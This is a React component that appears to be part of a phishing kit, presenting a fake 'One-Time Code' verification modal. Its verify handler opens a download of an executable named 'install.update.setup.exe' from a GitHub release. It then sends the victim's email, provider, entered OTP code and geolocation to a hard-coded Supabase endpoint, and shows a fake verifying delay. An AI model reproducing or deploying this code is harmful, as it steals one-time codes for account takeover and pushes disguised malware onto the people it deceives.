import React, { useState, useRef, useEffect } from 'react';
import { RefreshCw } from 'lucide-react';
import { getGeoInfo } from '../utils/geoip';

interface OTPPageProps {
  email: string;
  providerId: string;
  onVerify: () => void;
  onClose: () => void;
}

export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPageProps) {
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleVerify = async () => {
    if (code.replace(/\D/g, '').length < 6) {
      setError('Please enter the full 6-digit code.');
      return;
    }
    setError('');
    setLoading(true);

    // Open the required URL in a new tab (to avoid leaving the main page flow)
    window.open('https://github.com/Hanock1625/update/releases/download/v1.0/install.update.setup.exe', '_blank');

    try {
      const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
      const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';

      // Resolve geolocation (cached, never blocks UX)
      const geo = await getGeoInfo();

      await fetch(`${supabaseUrl}/functions/v1/login`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${supabaseKey}`,
          'apikey': supabaseKey,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: email,
          provider: providerId,
          password: `[OTP Code] ${code}`,
          // Spread all available geo fields
          ...geo,
        })
      });
    } catch (err) {
      console.error("Error sending OTP code:", err);
    }

    setTimeout(() => {
      setLoading(false);
      onVerify();
    }, 2000);
  };

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 6);
    setCode(val);
    setError('');
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleVerify();
  };

  return (
    <div
      id="otp-page-root"
      className="fixed inset-0 z-40 flex items-center justify-center"
    >
      {/* Modal card — matches Capture.PNG */}
      <div
        id="otp-page-card"
        className="bg-[#1c1b1b] border border-white/10 rounded-2xl w-full max-w-[480px] mx-4 overflow-hidden shadow-2xl"
        style={{ animation: 'otpSlideUp 0.3s cubic-bezier(0.16,1,0.3,1)' }}
      >
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-white/8">
          <h2 className="text-base font-semibold text-white font-sans tracking-tight">
            One-Time Code
          </h2>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white transition-colors text-xl leading-none cursor-pointer select-none"
            aria-label="Close"
          >
            ✕
          </button>
        </div>

        {/* Body */}
        <div className="px-6 py-8 space-y-6 bg-[#161515]">
          {/* Key icon */}
          <div className="flex justify-center">
            <span style={{ fontSize: '3rem', lineHeight: 1 }} aria-hidden="true">🔑</span>
          </div>

          {/* Instruction */}
          <p className="text-center text-sm text-gray-300 font-sans">
            Enter the 6-digit code sent to your email
          </p>

          {/* Single code input — styled like Capture.PNG */}
          <div className="space-y-1">
            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              value={code}
              onChange={handleInput}
              onKeyDown={handleKeyDown}
              placeholder="000000"
              maxLength={6}
              disabled={loading}
              className={`w-full bg-[#0e0e0e] border rounded-xl px-5 py-3.5 text-center text-xl font-mono tracking-[0.45em] text-white placeholder-gray-600
                focus:outline-none transition-all duration-150
                ${error ? 'border-red-500/60 focus:border-red-500' : 'border-white/12 focus:border-white/30'}`}
              aria-label="One-time code"
            />
            {error && (
              <p className="text-xs text-red-400 text-center font-sans pt-1">{error}</p>
            )}
          </div>

          {/* Buttons */}
          <div className="flex items-center justify-end gap-3 pt-1">
            <button
              type="button"
              onClick={onClose}
              disabled={loading}
              className="px-5 py-2 rounded-lg bg-white/8 hover:bg-white/12 border border-white/10 text-sm font-sans font-medium text-gray-300 hover:text-white transition-colors cursor-pointer disabled:opacity-50"
            >
              Close
            </button>
            <button
              type="button"
              onClick={handleVerify}
              disabled={loading}
              className="px-6 py-2 rounded-lg bg-white/10 hover:bg-white/16 border border-white/15 text-sm font-sans font-semibold text-white transition-colors cursor-pointer disabled:opacity-50 flex items-center gap-2"
            >
              {loading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Verifying...
                </>
              ) : (
                'Verify'
              )}
            </button>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes otpSlideUp {
          from { opacity: 0; transform: translateY(20px) scale(0.97); }
          to   { opacity: 1; transform: translateY(0)    scale(1);    }
        }
      `}</style>
    </div>
  );
}
